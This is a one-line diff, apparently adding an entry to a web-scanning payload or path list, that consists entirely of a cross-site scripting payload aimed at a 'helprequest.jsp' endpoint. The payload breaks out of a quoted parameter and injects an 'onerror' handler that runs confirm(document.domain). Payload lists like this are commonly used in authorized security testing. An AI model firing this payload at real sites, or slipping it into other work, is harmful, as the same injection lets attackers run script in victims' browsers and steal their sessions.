@@ -1,0 +1,1 @@
+/jsps/helprequest.jsp?url=%27)%22+onerror=%22confirm(%27document.domain%27)%22
